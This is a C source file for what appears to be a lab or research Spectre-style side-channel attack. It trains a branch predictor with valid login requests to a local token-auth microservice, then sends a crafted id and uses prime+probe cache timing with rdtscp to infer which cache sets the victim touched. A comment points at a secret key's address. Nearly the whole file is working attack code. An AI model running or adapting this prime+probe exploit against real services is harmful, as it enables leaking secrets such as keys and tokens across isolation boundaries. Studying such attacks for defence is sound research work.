#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <curl/curl.h>

#include "attacker.h"

#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)

#define CACHE_THRESHOLD 100
#define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
#define TRAINING_REPS 100
#define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
// ADDRESS SECRET_KEY[0] -> 0x555555556008

unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
CURL *curl_handle;


int main(int argc, char* argv[]) {
    cache_threshold();

    // prep attack and training data for request
    char* attack_id = "2";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    char attack_data[42];
    snprintf(attack_data, 42, "username=user1&password=password&id=%s", attack_id);
    char *valid_data = "username=user1&password=password&id=2";

    // set up curl 
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    if (curl_handle){
        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
    }


    int count[SETS] = {0}; // records sets that have been touched
    
    int loops = 10;
    while (loops > 0){
        // Train BP
        for(int i = 0; i < TRAINING_REPS; i++){
                make_request(valid_data); // send valid credentials
            }
        
        // Prime L1 cache
        // just need to hit each cache line once (so will skip indexes on the same line)
        for (int j = 0; j < 5; j++){
            // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
            for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
                probe_array[i] = 0; 
            }
        }
        
        _mm_mfence(); // wait for prime to compelte before sending bad request
        // cache check 
        make_request(attack_data);
        _mm_mfence();

        check_cache_presence(count);
        loops --;
    }
    for (int i = 0; i < SETS; i ++){
        if (count[i] > 0){
            printf("Set %d: %d\n", i, count[i]);
        }
    }


    curl_easy_cleanup(curl_handle);

    return 0;
}


void check_cache_presence(int *count){
    int present = 0;
    uint64_t t1, t2;
    unsigned int pid;
    for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
            _mm_lfence();
            t1 = __rdtscp(&pid);
            _mm_lfence();

            pid = probe_array[i];

            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();
            
            if (t2 - t1 < CACHE_THRESHOLD){
                present ++;
                
            }
            else{
                int set_index = (i / INDEXES_PER_LINE) % SETS;
                count[set_index]++;
            }
        }
    
    // printf("%d/%d cache hits\n", present, NO_LINES);
}

// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
volatile int test_data = 2;
void cache_threshold(){
    uint64_t t1, t2;
    unsigned int pid;
    volatile int junk; 

    junk = test_data;
    junk = test_data;

    _mm_lfence();
    t1 = __rdtscp(&pid);
    _mm_lfence();

    pid = test_data;

    _mm_lfence();
    t2 = __rdtscp(&pid);
    _mm_lfence();

    uint64_t time = t2 - t1;
    printf("hit Time: %ld, %d\n", time, junk);

    _mm_clflush((void*)&test_data);
    _mm_mfence();

    _mm_lfence();
    t1 = __rdtscp(&pid);
    _mm_lfence();

    pid = test_data;

    _mm_lfence();
    t2 = __rdtscp(&pid);
    _mm_lfence();

    time = t2 - t1;
    printf("miss Time: %ld\n", time, junk);
}


// send request with curl request for token to microservice
void make_request(char *data){
    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
    curl_easy_perform(curl_handle); 
}

// returns junk so that curl doesnt write to console
size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
{
    (void)buffer;
    (void)userp;
    return size * nmemb;
}





